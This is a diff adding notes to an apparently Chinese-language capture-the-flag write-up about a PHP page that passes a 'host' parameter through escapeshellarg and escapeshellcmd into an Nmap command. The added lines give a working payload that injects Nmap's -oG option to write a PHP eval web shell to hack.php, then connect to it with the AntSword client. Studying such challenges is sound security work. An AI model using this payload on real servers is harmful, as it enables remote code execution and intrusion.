@@ -894,3 +894,11 @@ if(!isset($_GET['host'])) {    highlight_file(__FILE__);
 第一个部分获取了客户端的真实IP,第二个部分则通过get方法得到的参数host进行nmap扫描，并将扫描结果存放在一个文件里，并会回显路径。
 第二个部分对传入的参数host进行了两步处理：
 escapeshellarg以及escapeshellcmd。
+关于这俩：[[PHP escapeshellarg()+escapeshellcmd() 之殇.pdf]]
+这两个函数连用是有任意命令执行的风险的，在这道题里，其用在了一条Nmap扫描的系统命令里。
+Nmap的后缀-oG用来将扫描结果存放到文件里。
+只需要将其扫描的IP换为可执行代码（即host参数），并将其保存为php文件，即可任意命令的执行。
+传递payload：
+`?host=' <?php @eval($_POST["hack"]);?> -oG hack.php '
+`
+使用蚁剑连接，即可获取flag
